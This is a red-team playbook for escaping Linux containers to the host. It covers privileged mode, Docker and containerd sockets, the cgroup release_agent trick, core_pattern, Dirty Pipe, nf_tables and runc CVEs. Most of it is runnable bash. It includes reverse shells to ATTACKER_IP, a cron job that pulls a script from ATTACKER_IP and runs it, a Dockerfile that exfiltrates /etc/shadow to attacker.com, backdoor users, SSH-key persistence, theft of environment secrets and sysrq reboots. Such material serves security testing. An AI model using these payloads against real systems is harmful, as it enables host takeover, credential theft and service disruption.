# Container Escape Techniques

> **MITRE ATT&CK Mapping**: T1611 - Escape to Host
> **Tactic**: Privilege Escalation
> **Platforms**: Containers, Linux
> **Required Permissions**: Varies (root in container, specific capabilities, or kernel vulnerability)
> **OPSEC Risk**: High - Container escapes often trigger runtime security alerts, kernel-level anomalies, and audit log entries on the host

---

## Strategic Overview

Container escape represents one of the most impactful attack vectors in modern cloud-native environments. When an attacker breaks out of the container isolation boundary, they gain access to the underlying host operating system, which in Kubernetes environments typically means access to the node and, by extension, every other container running on that node. The strategic value of container escape cannot be overstated: a single successful breakout can pivot an attacker from a sandboxed, resource-constrained environment to full root access on the host, enabling lateral movement across the cluster, access to secrets stored on the node, and potential compromise of the entire Kubernetes control plane.

The container isolation model relies on several Linux kernel primitives -- namespaces, cgroups, seccomp profiles, AppArmor/SELinux, and capability restrictions. Each of these layers can be weakened or bypassed through misconfigurations (such as running containers in privileged mode), vulnerabilities in container runtimes (runc, containerd, CRI-O), or kernel-level exploits that transcend the namespace boundary entirely. Red team operators must understand the full spectrum of escape vectors, from trivial misconfigurations to sophisticated race condition exploits, to accurately assess the security posture of containerized environments.

The 2024-2025 period has seen a dramatic increase in container escape research, with the "Leaky Vessels" disclosures affecting runc and BuildKit, critical Docker Desktop vulnerabilities (CVE-2025-9074), and three new runc race condition CVEs disclosed in November 2025 (CVE-2025-31133, CVE-2025-52565, CVE-2025-52881). These developments underscore that container isolation is a moving target, and defenders must continuously update their security posture while red teamers maintain current knowledge of the evolving escape surface.

---

## Technical Deep-Dive

### 1. Privileged Container Escape

The most straightforward container escape occurs when a container is launched with the `--privileged` flag. This flag disables virtually all security boundaries: all capabilities are granted, seccomp filtering is disabled, AppArmor/SELinux confinement is removed, and all host devices become accessible under `/dev`. This is the equivalent of running a process as root directly on the host but with a thin namespace wrapper.

#### Detecting Privileged Mode from Inside the Container

```bash
# Check if running in privileged mode
# Method 1: Try to list host devices
ls /dev/sda* 2>/dev/null && echo "PRIVILEGED: Block devices accessible"

# Method 2: Check capabilities
cat /proc/self/status | grep CapEff
# Privileged containers will show: CapEff: 000001ffffffffff (all bits set)

# Method 3: Check seccomp status
grep Seccomp /proc/self/status
# Privileged: Seccomp: 0 (disabled)
# Unprivileged: Seccomp: 2 (filter mode)

# Method 4: Try accessing IP tables (requires NET_ADMIN + NET_RAW)
iptables -L 2>/dev/null && echo "PRIVILEGED: iptables accessible"

# Method 5: Check mounted filesystems for cgroup write access
mount | grep cgroup
```

#### Mount Host Filesystem and Escape

```bash
# Step 1: Identify host disk
fdisk -l 2>/dev/null || ls /dev/sd* /dev/nvme* /dev/vd* 2>/dev/null

# Step 2: Create mount point and mount host root filesystem
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
# Or for cloud instances:
mount /dev/nvme0n1p1 /mnt/host
# Or for virtual machines:
mount /dev/vda1 /mnt/host

# Step 3: Verify access to host filesystem
ls /mnt/host/etc/shadow
cat /mnt/host/etc/hostname

# Step 4: Establish persistence via cron
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /mnt/host/etc/crontab

# Step 5: Add SSH key for persistent access
mkdir -p /mnt/host/root/.ssh
echo "ssh-rsa AAAA...attacker_key..." >> /mnt/host/root/.ssh/authorized_keys

# Step 6: Or create a new root user
echo 'backdoor:$6$salt$hash:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd
```

#### nsenter to Host Namespaces

```bash
# The nsenter technique uses the host's PID 1 as an anchor to enter all host namespaces
# This is the cleanest escape method from a privileged container

# Enter all host namespaces at once
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# This gives you a shell running in the host's context with:
# - Host filesystem (mount namespace)
# - Host hostname (UTS namespace)
# - Host IPC (IPC namespace)
# - Host networking (net namespace)
# - Host process tree (PID namespace)

# Verify escape
hostname
cat /etc/hostname
ip addr show
ps aux | head -20

# Selective namespace entry for stealth
# Only enter mount namespace (access files without full context switch)
nsenter --target 1 --mount -- cat /etc/shadow

# Only enter network namespace (sniff host traffic)
nsenter --target 1 --net -- tcpdump -i eth0 -c 100
```

#### Accessing Kernel Interfaces via /dev

```bash
# In privileged containers, /dev is fully populated with host devices

# Access host memory directly
cat /dev/mem | xxd | head

# Access kernel memory
cat /dev/kmem | xxd | head

# Use debugfs to access filesystem at block level
debugfs /dev/sda1

# Load kernel modules (devastating capability)
insmod /path/to/malicious.ko

# Access host GPU for cryptomining
ls /dev/nvidia*
```

---

### 2. Docker Socket Mount Escape

When the Docker socket (`/var/run/docker.sock`) is mounted into a container, the container has full control over the Docker daemon running on the host. This is commonly found in CI/CD pipelines, monitoring containers, and Docker-in-Docker setups.

#### Discovery and Exploitation

```bash
# Step 1: Check if Docker socket is mounted
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 Jan  1 00:00 /var/run/docker.sock

# Step 2: Install Docker CLI if not present (using static binary)
curl -fsSL https://download.docker.com/linux/static/stable/x86_64/docker-24.0.7.tgz \
  -o /tmp/docker.tgz
tar xzf /tmp/docker.tgz -C /tmp/
export PATH=$PATH:/tmp/docker

# Step 3: Verify access to the Docker daemon
docker ps
docker info

# Step 4: Create a new privileged container with host root mounted
docker run -it --rm --privileged \
  --pid=host \
  --net=host \
  -v /:/hostfs \
  alpine:latest chroot /hostfs /bin/bash

# Step 5: Or use the API directly without Docker CLI
# List containers
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# Create a new container with host mount
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", "cat /hostfs/etc/shadow"],
    "HostConfig": {
      "Binds": ["/:/hostfs"],
      "Privileged": true
    }
  }'

# Start the container (use container ID from above)
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/<CONTAINER_ID>/start

# Read the output
curl -s --unix-socket /var/run/docker.sock \
  http://localhost/containers/<CONTAINER_ID>/logs?stdout=true
```

#### Docker-in-Docker Abuse Patterns

```bash
# Pattern 1: Build a malicious image that steals host data
cat > /tmp/Dockerfile <<'EOF'
FROM alpine:latest
RUN apk add --no-cache curl
CMD cat /hostfs/etc/shadow | curl -X POST -d @- https://attacker.com/exfil
EOF
docker build -t exfil:latest -f /tmp/Dockerfile /tmp/
docker run --rm -v /:/hostfs exfil:latest

# Pattern 2: Deploy a reverse shell container on the host network
docker run -d --rm --net=host --pid=host --privileged \
  alpine:latest sh -c 'apk add bash; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Pattern 3: Access other containers' filesystems
# List all containers and their mount points
for cid in $(docker ps -q); do
  echo "=== Container: $cid ==="
  docker inspect $cid | grep -A5 "Mounts"
done

# Pattern 4: Inject into a running container
docker exec -it <target_container_id> /bin/sh

# Pattern 5: Steal environment variables (often contain secrets)
for cid in $(docker ps -q); do
  echo "=== Container: $cid ==="
  docker inspect $cid --format '{{range .Config.Env}}{{println .}}{{end}}'
done
```

#### Exploiting via containerd Socket

```bash
# If containerd socket is available instead of Docker socket
ls -la /run/containerd/containerd.sock

# Use ctr CLI tool
ctr --address /run/containerd/containerd.sock containers list
ctr --address /run/containerd/containerd.sock images list

# Create an escape container via containerd
ctr --address /run/containerd/containerd.sock run \
  --mount type=bind,src=/,dst=/hostfs,options=rbind \
  --privileged \
  docker.io/library/alpine:latest escape-shell /bin/sh
```

---

### 3. cgroup Escape (release_agent Technique)

The cgroup v1 `release_agent` escape is one of the most elegant container escape techniques. It abuses the legacy cgroups v1 feature `notify_on_release`, which triggers a user-defined script on the host when the last process in a cgroup exits. This technique was first documented in 2019 and was observed being used in real-world attacks (cryptocurrency mining campaigns) as confirmed by Aqua Security's Team Nautilus in 2024.

#### Requirements

- Running as root inside the container
- Container has the `CAP_SYS_ADMIN` Linux capability
- Container lacks an AppArmor profile or allows the `mount` syscall
- cgroup v1 virtual filesystem is mounted read-write inside the container

#### Step-by-Step cgroup v1 release_agent Escape

```bash
#!/bin/bash
# cgroup v1 release_agent container escape PoC
# Tested on Docker with --cap-add=SYS_ADMIN --security-opt apparmor=unconfined

# Step 1: Mount a cgroup controller (use any available controller like rdma or memory)
# We create a temporary directory and mount a cgroup hierarchy into it
mkdir -p /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null || \
mount -t cgroup -o cpu cgroup /tmp/cgrp

# Step 2: Create a child cgroup directory
mkdir -p /tmp/cgrp/escape

# Step 3: Enable notify_on_release - this tells the kernel to execute
# the release_agent when the last process in this cgroup exits
echo 1 > /tmp/cgrp/escape/notify_on_release

# Step 4: Determine the container's filesystem path on the host
# The upperdir in the overlay mount reveals our path on the host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
# Alternative method if the above does not work:
# host_path=$(cat /proc/self/mountinfo | grep "workdir" | awk -F'upperdir=' '{print $2}' | cut -d, -f1)

# Step 5: Set the release_agent to our payload script path ON THE HOST
# The release_agent path must be a path that exists on the HOST filesystem
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Step 6: Create the payload script (this will execute on the HOST)
cat > /cmd <<'PAYLOAD'
#!/bin/sh
# This runs as root on the HOST, not in the container
# Reverse shell to attacker
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Or exfiltrate data
cat /etc/shadow > /tmp/pwned.txt
hostname >> /tmp/pwned.txt
id >> /tmp/pwned.txt

# Or add persistence
echo '* * * * * root curl http://ATTACKER_IP/shell.sh | bash' >> /etc/crontab
PAYLOAD
chmod +x /cmd

# Step 7: Trigger the escape by spawning a process in the cgroup that immediately exits
# Writing the PID of a short-lived process into cgroup.procs triggers notify_on_release
sh -c "echo \$\$ > /tmp/cgrp/escape/cgroup.procs"

# Step 8: Verify (the /cmd script has now executed on the host)
# Check for output if using file exfiltration method
sleep 1
cat /tmp/pwned.txt 2>/dev/null

# Cleanup
umount /tmp/cgrp
rm -rf /tmp/cgrp /cmd
```

#### Enhanced PoC with Output Retrieval

```bash
#!/bin/bash
# Enhanced cgroup escape with bidirectional communication

mkdir -p /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Execute arbitrary command and write output back to container-visible path
cat > /cmd <<'EOF'
#!/bin/sh
OUTPUT_FILE="HOSTPATH/output"
# Run the command on the host and capture output
ps aux > "$OUTPUT_FILE" 2>&1
id >> "$OUTPUT_FILE" 2>&1
cat /etc/hostname >> "$OUTPUT_FILE" 2>&1
EOF
sed -i "s|HOSTPATH|$host_path|g" /cmd
chmod +x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 2
cat /output
```

#### CVE-2022-0492: cgroup Escape Without CAP_SYS_ADMIN

```bash
# CVE-2022-0492 removed the requirement for CAP_SYS_ADMIN
# Affected Linux kernels before 5.16.2, 5.15.17, 5.10.93, 5.4.176, etc.
# The kernel failed to verify capabilities when writing to release_agent

# Exploit: Any process that can mount a cgroup hierarchy (via unshare)
# can write an arbitrary path to release_agent without CAP_SYS_ADMIN
# in the initial user namespace

unshare -UrC bash -c '
  mkdir -p /tmp/cgrp
  mount -t cgroup -o rdma cgroup /tmp/cgrp
  mkdir /tmp/cgrp/x
  echo 1 > /tmp/cgrp/x/notify_on_release
  host_path=$(sed -n "s/.*\perdir=\([^,]*\).*/\1/p" /etc/mtab)
  echo "$host_path/cmd" > /tmp/cgrp/release_agent
  echo "#!/bin/sh" > /cmd
  echo "id > ${host_path}/output" >> /cmd
  chmod +x /cmd
  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
'
```

#### cgroup v2 Differences

```
cgroup v2 (unified hierarchy) does NOT have the release_agent mechanism.
Instead, it uses a different notification model:

- cgroup.events file: Contains "populated 0/1" indicating if the cgroup
  has any processes. This can be monitored via inotify but does NOT
  execute arbitrary scripts.

- No release_agent file exists in cgroup v2 at all.

This means the classic release_agent escape is NOT possible on systems
using pure cgroup v2 (default on Ubuntu 22.04+, Fedora 31+, Debian 11+).

However, many systems still mount cgroup v1 in hybrid mode, which may
still be exploitable. Check:
  mount | grep cgroup
  # "cgroup2" = v2 only (safe from release_agent)
  # "cgroup" = v1 (potentially vulnerable)
  # Both present = hybrid mode (check if v1 controllers are available)

Detection of cgroup version:
  stat -f -c %T /sys/fs/cgroup/
  # "cgroup2fs" = v2
  # "tmpfs" = v1
```

---

### 4. Kernel Exploits from Containers

Containers share the host kernel, which means any kernel vulnerability exploitable from within a container can potentially be leveraged for escape. This is one of the fundamental limitations of container isolation compared to virtual machines.

#### CVE-2022-0847 - Dirty Pipe (Linux Kernel 5.8 - 5.16.10)

```bash
# Dirty Pipe allows overwriting read-only files via pipe splice
# Can be used to escape containers by overwriting the runc binary

# Check if kernel is vulnerable
uname -r
# Vulnerable: 5.8.x through 5.16.10 (before patches)

# Container escape via Dirty Pipe:
# 1. Overwrite /etc/passwd to add root user (basic privesc)
# 2. Overwrite runc binary to inject code that executes on next container start
# 3. Overwrite any SUID binary on the host filesystem

# PoC concept (simplified):
# The exploit creates a pipe, fills it, drains it, then uses splice()
# to associate the pipe with a target file, then writes arbitrary data
# that overwrites the file content at a specific offset

# Exploit flow for container escape:
# 1. From privileged container or with host filesystem access
# 2. Locate runc binary on host: /usr/bin/runc or /usr/sbin/runc
# 3. Use Dirty Pipe to overwrite runc with a trojanized version
# 4. Next time any container operation triggers runc, attacker code runs on host

# Using the greenhandatsjtu/CVE-2022-0847-Container-Escape PoC:
# Compile the exploit
gcc -o dirty_pipe_escape exploit.c
# The exploit overwrites the runc binary entry point to inject shellcode
# that provides a reverse shell from the host context
./dirty_pipe_escape /proc/self/exe  # Targets runc
```

#### CVE-2024-1086 - nf_tables Use-After-Free (Linux Kernel 5.14 - 6.6)

```bash
# CVE-2024-1086 exploits a use-after-free in netfilter's nf_tables
# 99.4% success rate on KernelCTF images
# Actively exploited in ransomware campaigns (confirmed by CISA Oct 2025)

# Check vulnerability
uname -r
# Vulnerable: v5.14 through v6.6 (unpatched)
# Fixed in: 5.15.149+, 6.1.76+, 6.6.15+

# The vulnerability: nft_verdict_init() allows positive values as drop
# error within the hook verdict. nf_hook_slow() then causes a double-free
# when NF_DROP is issued with a drop error resembling NF_ACCEPT.

# From within a container (requires ability to create user namespaces):
unshare -Urn  # Create user namespace with mapped root

# The exploit leverages netfilter to achieve:
# 1. Heap corruption via double-free
# 2. Arbitrary read/write primitive
# 3. Overwrite kernel credentials to gain root
# 4. Escape container namespaces

# Public PoC: https://github.com/Notselwyn/CVE-2024-1086
# Compile and run from within container
git clone https://github.com/Notselwyn/CVE-2024-1086.git
cd CVE-2024-1086
make
./exploit

# Mitigation check - is nf_tables module loaded?
lsmod | grep nf_tables
# If not needed, module can be blacklisted:
# echo "blacklist nf_tables" > /etc/modprobe.d/disable-nf_tables.conf
```

#### Leaky Vessels CVEs (January 2024)

The "Leaky Vessels" disclosure by Snyk revealed four critical container breakout vulnerabilities affecting runc and Docker BuildKit:

```bash
# === CVE-2024-21626: runc process.cwd Leaked File Descriptor ===
# CVSS: 8.6 (High)
# Affects: runc <= 1.1.11
# Fixed: runc 1.1.12+

# The vulnerability: During container setup, runc leaks a file descriptor
# to the host filesystem. The container's working directory (process.cwd)
# can reference this leaked fd via /proc/self/fd/<n>, allowing the
# container process to access files on the host.

# Exploitation via malicious container image:
# A Dockerfile that exploits CVE-2024-21626:
# FROM ubuntu:latest
# WORKDIR /proc/self/fd/7  # Points to host filesystem via leaked fd
# RUN cat /etc/shadow > /tmp/host_shadow  # Reads host file during build

# Exploitation via runc exec:
# If an attacker can influence the working directory of a new process
# started via runc exec, they can set cwd to /proc/self/fd/<N> where
# N is the leaked file descriptor, gaining host filesystem access.

# Detection: Monitor for suspicious WORKDIR values in Dockerfiles
# and container specs that reference /proc/self/fd/

# === CVE-2024-23651: BuildKit Mount Cache Race ===
# Race condition in BuildKit's mount cache that could lead to
# container accessing files from the build host.

# === CVE-2024-23652: BuildKit Arbitrary Deletion ===
# Allows a malicious BuildKit frontend or Dockerfile to delete
# files outside the container during build.

# === CVE-2024-23653: BuildKit Privilege Check Bypass ===
# Allows running containers with elevated privileges during build
# by bypassing privilege checks in the GRPC interface.

# Remediation for all Leaky Vessels:
# - Update runc to >= 1.1.12
# - Update Docker to >= 25.0.1
# - Update BuildKit to >= 0.12.5
```

---

### 5. runc Vulnerabilities

runc is the reference implementation of the OCI runtime specification and is used by Docker, containerd, CRI-O, and Podman. Vulnerabilities in runc directly impact the container escape surface across all major container runtimes.

#### CVE-2019-5736: Overwrite runc Binary

```bash
# CVE-2019-5736 allows a malicious container to overwrite the host runc
# binary and gain root-level code execution on the host.
# Affects: runc < 1.0-rc6

# Attack flow:
# 1. Attacker controls a container (e.g., via a malicious image)
# 2. Container overwrites /proc/self/exe (which points to the runc binary)
# 3. Next time runc is invoked on the host, the overwritten binary executes
#    attacker-controlled code with host root privileges

# Simplified PoC concept:
#!/bin/bash
# Inside the malicious container:

# Step 1: Wait for a runc process to appear (triggered by docker exec)
while ! pgrep -f 'runc'; do sleep 0.1; done

# Step 2: Open runc binary via /proc/self/exe
# Step 3: Overwrite it with our payload
cat > /proc/self/exe <<'PAYLOAD'
#!/bin/bash
# This now runs as root on the HOST
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
PAYLOAD

# The exploit requires timing the overwrite between runc's init
# and the actual container exec, making it a race condition.

# Mitigations applied in runc >= 1.0-rc6:
# - runc now creates a memfd copy of itself before executing
# - The original binary can no longer be overwritten via /proc/self/exe
```

#### CVE-2024-21626: Leaked File Descriptor (Leaky Vessels)

```bash
# Detailed exploitation of the leaked fd vulnerability

# The root cause: During container setup, runc opens a file descriptor
# to the host's /sys/fs/cgroup directory. This fd is not properly closed
# before the container process starts, making it accessible via
# /proc/self/fd/<N> inside the container.

# Step 1: Enumerate leaked file descriptors
ls -la /proc/self/fd/
# Look for symlinks pointing outside the container's root filesystem

# Step 2: Check each fd for host filesystem access
for fd in /proc/self/fd/*; do
    target=$(readlink "$fd" 2>/dev/null)
    echo "fd $(basename $fd) -> $target"
done

# Step 3: If a leaked fd points to the host filesystem:
# Access it via the /proc/self/fd/ path
ls /proc/self/fd/7/  # If fd 7 leaks to host
cat /proc/self/fd/7/etc/shadow  # Read host files

# Fix: runc 1.1.12 ensures all host fds are closed via O_CLOEXEC
# and verifies the working directory doesn't escape the container root
```

#### CVE-2025-31133, CVE-2025-52565, CVE-2025-52881 (November 2025)

These three vulnerabilities were disclosed on November 5, 2025, by a SUSE security researcher and affect nearly all versions of runc. They exploit race conditions and mount manipulation to undermine core container isolation.

```bash
# === CVE-2025-31133: Masked Path Abuse ===
# Severity: High
# The maskedPaths feature in runc prevents containers from accessing
# sensitive host files by bind-mounting /dev/null over them.
#
# Attack: During container creation, the attacker replaces the /dev/null
# device node with a symbolic link. This tricks runc into mounting
# arbitrary host paths instead of masking the sensitive files.
#
# Impact: Attacker can redirect sysctl writes to dangerous files like
# /proc/sysrq-trigger (system crash) or /proc/sys/kernel/core_pattern
# (code execution on host).

# === CVE-2025-52565: /dev/console Mount Race ===
# Severity: High
# Exploits insufficient validation during /dev/pts/$n mounting
# to /dev/console. The attacker wins a race condition to redirect
# mounts before security protections activate.
#
# Impact: Unauthorized write access to protected procfs files.

# === CVE-2025-52881: Procfs Write Redirect ===
# Severity: High
# Abuses race conditions with shared mounts to redirect runc's
# own writes to /proc files.
#
# Impact: Manipulation of /proc/sysrq-trigger, /proc/sys/kernel/core_pattern
# enabling system crash or container escape via privilege escalation.

# Affected versions: Nearly all runc versions before patches
# Fixed in: runc 1.2.8, 1.3.3, 1.4.0-rc.3 or later

# Detection: Monitor for rapid mount/unmount operations during
# container creation, unusual symlink creation in /dev/,
# and writes to sensitive /proc paths.
```

#### CVE-2025-9074: Docker Desktop Container Escape (August 2025)

```bash
# CVSS: 9.3 (Critical)
# Affects: Docker Desktop < 4.44.3 on Windows and macOS
# Does NOT affect Docker on Linux (uses named pipe, not TCP socket)

# Root Cause: Docker Desktop exposes the Docker Engine API over TCP
# at 192.168.65.7:2375 with NO authentication or TLS enforcement
# inside the VM.

# Attack: Any container running on Docker Desktop can reach the
# Docker Engine API without requiring /var/run/docker.sock to be mounted.

# Exploitation:
# Step 1: From inside any container, access the unprotected API
curl http://192.168.65.7:2375/version
curl http://192.168.65.7:2375/containers/json

# Step 2: Create a privileged container with host filesystem access
curl -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh"],
    "Tty": true,
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/hostfs"]
    }
  }'

# On Windows (WSL2 backend): Containers can mount the entire filesystem,
# read sensitive files, and overwrite system DLLs for privilege escalation
# to SYSTEM/Administrator.

# On macOS: Containers can access the macOS host filesystem via the
# Docker Desktop VM, potentially reading user files, keychains, etc.

# Alternative vector: SSRF vulnerabilities in containerized applications
# can be chained with this unauthenticated API to achieve container escape
# without direct container access.

# Fixed: Docker Desktop 4.44.3+
```

---

### 6. SYS_ADMIN Capability Abuse

The `CAP_SYS_ADMIN` capability is an extremely powerful capability that enables numerous kernel operations. It is often called "the new root" because of the breadth of operations it permits.

```bash
# Check for CAP_SYS_ADMIN
grep CapEff /proc/self/status
# Decode capabilities
capsh --decode=<hex_value>
# Or use getpcaps
getpcaps $$

# === Mount Operations ===
# CAP_SYS_ADMIN allows mounting filesystems, which enables the cgroup escape
mount -t cgroup -o rdma cgroup /tmp/cgrp
# Can also mount proc, sysfs, devtmpfs, etc.
mount -t proc proc /tmp/proc
mount -t tmpfs tmpfs /tmp/tmpfs

# === BPF Program Loading ===
# CAP_SYS_ADMIN (or CAP_BPF on newer kernels) allows loading BPF programs
# BPF programs run in kernel context and can be used for:
# - Keylogging (attach to keyboard input events)
# - Network sniffing (attach to network stack)
# - Process monitoring (attach to syscall tracepoints)
# - Kernel exploitation (BPF verifier bypass)

# Load a BPF program for host network monitoring
bpftool prog load monitor.bpf.o /sys/fs/bpf/monitor
bpftool net attach xdp id <prog_id> dev eth0

# === User Namespace Creation ===
# CAP_SYS_ADMIN allows creating new user namespaces
# This can be leveraged to gain additional capabilities within the new namespace
unshare -U --map-root-user /bin/bash
# Now root in new user namespace, can create other namespaces
unshare -m  # New mount namespace
unshare -n  # New network namespace
unshare -p  # New PID namespace

# === Abuse via /proc/sys Writes ===
# Many /proc/sys entries require CAP_SYS_ADMIN to modify
echo "core" > /proc/sys/kernel/core_pattern  # Redirect core dumps
echo 1 > /proc/sys/kernel/sysrq  # Enable SysRq
echo 176 > /proc/sys/kernel/sysrq  # Enable specific SysRq functions

# === ptrace System Calls ===
# CAP_SYS_ADMIN + CAP_SYS_PTRACE allows tracing any process
# Can be used to inject code into host processes if PID namespace is shared
```

---

### 7. Host PID Namespace Escape

When a container is started with `--pid=host`, the container shares the host's PID namespace. This means all host processes are visible inside the container, and process-level attacks become possible.

```bash
# Verify host PID namespace
ps aux | wc -l  # Will show many more processes than a normal container
ps aux | grep -v "container"  # Look for host processes like sshd, systemd

# === /proc/1/root Access ===
# PID 1 on the host is typically systemd or init
# /proc/1/root points to the host's root filesystem
ls /proc/1/root/
cat /proc/1/root/etc/shadow
cat /proc/1/root/etc/hostname

# Access any file on the host via /proc/1/root
ls /proc/1/root/home/
cat /proc/1/root/root/.ssh/id_rsa
cat /proc/1/root/root/.bash_history

# === Process Injection ===
# With host PID namespace, we can target host processes

# Method 1: Use /proc/<pid>/environ to steal secrets
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
    envs=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n')
    if echo "$envs" | grep -qi "password\|secret\|key\|token"; then
        echo "=== PID $pid: $(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ') ==="
        echo "$envs" | grep -i "password\|secret\|key\|token"
    fi
done

# Method 2: Use /proc/<pid>/mem to read process memory (requires SYS_PTRACE)
# Read memory maps first
cat /proc/<target_pid>/maps
# Then read specific memory regions
dd if=/proc/<target_pid>/mem bs=1 skip=<offset> count=<size> 2>/dev/null

# Method 3: Inject shared library via ptrace (requires SYS_PTRACE capability)
# Use a tool like linux-inject to inject a .so into a host process
# https://github.com/gaffe23/linux-inject

# Method 4: Send signals to host processes
kill -STOP <host_pid>  # Pause host process
kill -9 <host_pid>     # Kill host process (DoS)

# === nsenter via /proc ===
# Enter the namespace of any visible host process
nsenter --target <host_pid> --mount --net --pid -- /bin/bash
```

---

### 8. Host Network Namespace Escape

When a container uses `--net=host`, it shares the host's network namespace. This enables network-level attacks against the host and other containers.

```bash
# Verify host network namespace
ip addr show  # Will show host interfaces (eth0, ens*, etc.)
ip route show  # Will show host routing table

# === Network Sniffing ===
# Capture all host network traffic
tcpdump -i any -w /tmp/capture.pcap -c 10000
# Filter for interesting traffic
tcpdump -i any -A 'port 80 or port 443 or port 8080'
# Capture kubernetes API traffic
tcpdump -i any -A 'port 6443'

# === Bind to Host Ports ===
# Start a rogue service on a host port
python3 -m http.server 8080  # Serve files on host's port 8080
# Start a reverse proxy to intercept traffic
socat TCP-LISTEN:80,fork TCP:attacker.com:8443

# === Access Host-Only Services ===
# Many services bind to localhost on the host
curl http://127.0.0.1:10250/pods  # Kubelet API
curl http://127.0.0.1:2379/version  # etcd
curl http://127.0.0.1:8080/api  # Insecure K8s API
curl http://169.254.169.254/latest/meta-data/  # Cloud metadata

# === ARP Spoofing / MITM ===
# With host network access, ARP spoofing attacks the entire network segment
arpspoof -i eth0 -t <gateway_ip> <target_ip>
# Or use ettercap / bettercap for more sophisticated MITM

# === Kubernetes Service Discovery ===
# With host network, bypass Kubernetes network policies entirely
# Scan for other nodes and services
nmap -sV -p 6443,10250,10255,2379,2380 <node_cidr>

# === Docker API Access via Network ===
# Docker daemon may listen on TCP (often 2375/2376)
curl http://127.0.0.1:2375/version
curl http://127.0.0.1:2376/version --cert /cert.pem --key /key.pem
```

---

### 9. Core Pattern Escape

The `/proc/sys/kernel/core_pattern` file controls what happens when a process dumps core. By writing a pipe command to this file, an attacker can cause arbitrary command execution on the host when a crash occurs.

```bash
# Requirements:
# - Write access to /proc/sys/kernel/core_pattern
# - Ability to trigger a core dump

# Step 1: Check current core pattern
cat /proc/sys/kernel/core_pattern
# Default: "core" or "|/usr/share/apport/apport ..."

# Step 2: Determine our path on the host filesystem
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Step 3: Create the payload script
cat > /payload.sh <<'EOF'
#!/bin/sh
# Runs as root on the HOST when a core dump is triggered
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /payload.sh

# Step 4: Overwrite core_pattern with a pipe to our script
echo "|${host_path}/payload.sh" > /proc/sys/kernel/core_pattern

# Step 5: Trigger a core dump (segfault a process)
# Method 1: Compile and run a crashing program
cat > /tmp/crash.c <<'EOF'
#include <stdio.h>
int main() {
    char *p = NULL;
    *p = 'x';  // Segfault
    return 0;
}
EOF
gcc -o /tmp/crash /tmp/crash.c
# Ensure core dumps are enabled
ulimit -c unlimited
/tmp/crash  # Triggers core dump, which executes our payload on host

# Method 2: Kill a process with SIGSEGV
sleep 999 &
kill -SEGV $!

# Method 3: Use the kill command more directly
bash -c 'kill -11 $$'

# Note: This technique requires CAP_SYS_ADMIN or that /proc/sys/kernel
# is mounted writable (common in privileged containers).
# Modern container runtimes mask /proc/sys/kernel/core_pattern by default.
```

---

### 10. Sensitive Mount Paths

Several paths under `/proc` and `/sys` can be abused if they are accessible (writable) from within a container:

```bash
# === /proc/sysrq-trigger ===
# Triggers kernel SysRq commands - can cause immediate system reboot/crash
echo b > /proc/sysrq-trigger  # Immediate reboot (no sync, no umount)
echo c > /proc/sysrq-trigger  # Kernel crash (triggers crashdump)
echo o > /proc/sysrq-trigger  # Power off
echo s > /proc/sysrq-trigger  # Sync all filesystems
echo e > /proc/sysrq-trigger  # Send SIGTERM to all processes except init
echo i > /proc/sysrq-trigger  # Send SIGKILL to all processes except init

# === /proc/kmsg ===
# Kernel log messages - can leak sensitive kernel information
cat /proc/kmsg  # Read kernel ring buffer messages
# May contain: kernel addresses (KASLR bypass), device info, errors

# === /sys/firmware/efi/efivars ===
# UEFI firmware variables - can brick the system
ls /sys/firmware/efi/efivars/
# Deleting variables can render the system unbootable:
# rm /sys/firmware/efi/efivars/Boot*  # DO NOT DO THIS - can brick hardware

# === /proc/kcore ===
# Physical memory access in ELF core format
# Can be used to extract kernel memory, bypass KASLR
strings /proc/kcore | grep -i password

# === /proc/kallsyms ===
# Kernel symbol addresses - bypasses KASLR
cat /proc/kallsyms | head
# Use these addresses for kernel exploit development

# === /sys/kernel/debug ===
# Kernel debug filesystem (debugfs)
ls /sys/kernel/debug/
# Contains: tracing data, device info, kernel internals

# === /sys/class/net ===
# Network interface configuration
ls /sys/class/net/
# Can be used to discover host network interfaces

# === /proc/sys/kernel/modprobe ===
# Path to the kernel module loader
cat /proc/sys/kernel/modprobe
# If writable, can be changed to point to a malicious script
# that runs when any kernel module is requested

# === /proc/sys/vm/panic_on_oom ===
# If writable, can be set to force kernel panic on OOM
echo 1 > /proc/sys/vm/panic_on_oom
# Then exhaust memory to crash the host

# === /proc/sys/fs/binfmt_misc ===
# Binary format handlers - can register new binary interpreters
